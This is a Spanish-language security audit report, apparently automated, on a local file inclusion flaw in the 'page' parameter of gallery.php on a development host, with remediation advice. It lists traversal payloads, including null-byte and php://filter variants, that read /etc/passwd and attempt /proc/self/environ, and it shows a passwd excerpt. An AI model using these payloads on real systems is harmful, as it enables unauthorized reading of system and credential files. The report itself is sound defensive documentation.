# Informe de auditoría LFI — web.dev.local:8081

Fecha: 2026-04-27T07:34:38Z
Objetivo: http://web.dev.local:8081
Auditor: (automatizado)

Resumen ejecutivo
-----------------
Se detectó una vulnerabilidad Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Fue posible explotar la vulnerabilidad para leer ficheros locales sensibles como `/etc/passwd` usando rutas de traversal.

Evidencia y vectores probados
-----------------------------
1) Página vulnerable identificada: `http://web.dev.local:8081/gallery.php?page=modern` (parámetro `page`).

2) Payloads usados y resultados:
- ../../../../etc/passwd  → Incluyó y mostró contenido de /etc/passwd.
  Fragmento obtenido:
  ```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```

- php://filter/convert.base64-encode/resource=../../../../etc/passwd → Intento de filtrado base64 (respuesta: "Página no encontrada" en algunos casos).
- ../../../../proc/self/environ → Falló con mensajes de permiso (Warnings mostradas), confirmando inclusión/intentos de include en el servidor.

3) Observaciones técnicas: la aplicación incluye directamente un archivo basado en el valor del parámetro `page` sin una sanitización adecuada ni restricción de paths permitidos. El servidor responde incluyendo el archivo solicitado cuando existe, lo que permite traversal relativo fuera del directorio web.

Impacto
-------
Lectura de ficheros locales, divulgación de información sensible del sistema (usuarios del sistema). Potencial escalada si ficheros de configuración contienen credenciales (por ejemplo, archivos de configuración, .env, archivos de backup).

Recomendaciones
---------------
1) Validar y sanear el parámetro `page`: permitir únicamente valores de una lista blanca (p. ej. 'modern','classic','abstract','about') y mapearlos internamente a rutas fijas.
2) Evitar usar include/require con valores controlados por el usuario; usar rutas absolutas o mapeos internos.
3) Configurar `open_basedir` y restringir permisos del servidor para minimizar exposición de ficheros sensibles.
4) Revisar logs y rotar credenciales si se sospecha que ficheros con secrets fueron expuestos.

Comandos/requests ejecutadas (resumen)
-------------------------------------
- GET /gallery.php?page=modern
- GET /gallery.php?page=../../../../etc/passwd
- GET /gallery.php?page=../../../../etc/passwd%00
- GET /gallery.php?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
- GET /gallery.php?page=../../../../proc/self/environ

Conclusión
----------
La vulnerabilidad LFI existe y fue explotada con éxito para obtener `/etc/passwd`.

